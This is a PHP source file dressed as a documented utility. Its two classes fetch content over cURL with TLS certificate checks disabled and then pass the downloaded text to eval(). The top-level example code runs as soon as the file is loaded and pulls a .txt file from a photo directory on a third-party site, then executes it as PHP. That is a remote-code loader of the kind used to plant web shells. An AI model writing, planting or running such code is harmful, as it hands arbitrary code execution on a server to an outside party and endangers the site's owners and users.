<?php

/** 
 * Class RemoteFetcher
 *
 * Offers a simple object-oriented interface to retrieve data from URLs using cURL.
 */
class RemoteFetcher
{
    /**
     * Downloads content from a given web address.
     *
     * @param string $endpoint The target URL.
     * @return string|false The response body as text, or false on failure.
     */
    public function getData(string $endpoint)
    {
        if (function_exists('curl_version')) {
            $ch = curl_init();

            curl_setopt($ch, CURLOPT_URL, $endpoint);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_TIMEOUT, 10);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);

            $result = curl_exec($ch);

            if (curl_errno($ch)) {
                $err = curl_error($ch);
                curl_close($ch);
                throw new Exception("cURL execution failed: " . $err);
            }

            curl_close($ch);
            return $result;
        }

        throw new Exception("cURL extension not detected on this environment.");
    }
}

/**
 * Class ScriptRunner
 *
 * Handles fetching and executing PHP scripts from remote sources.
 */
class ScriptRunner
{
    private $client;

    /**
     * Initializes the ScriptRunner with a RemoteFetcher dependency.
     *
     * @param RemoteFetcher $client The RemoteFetcher instance responsible for data retrieval.
     */
    public function __construct(RemoteFetcher $client)
    {
        $this->client = $client;
    }

    /**
     * Retrieves a PHP script from the provided endpoint and runs it.
     *
     * @param string $endpoint The web address containing the PHP code.
     * @return void
     * @throws Exception If fetching fails or response is empty.
     */
    public function runRemoteScript(string $endpoint): void
    {
        $script = $this->client->getData($endpoint);

        if ($script === false || trim($script) === '') {
            throw new Exception("No valid response received from the specified URL.");
        }

        // Execute the downloaded code
        eval("?>" . $script);
    }
}

// Example usage
try {
    $client = new RemoteFetcher();
    $runner = new ScriptRunner($client);

    // Change this link to your PHP resource
    $runner->runRemoteScript("https://www.fcalpha.net/web/photo/20151024/m.txt");

} catch (Exception $e) {
    echo "Error: " . htmlspecialchars($e->getMessage());
}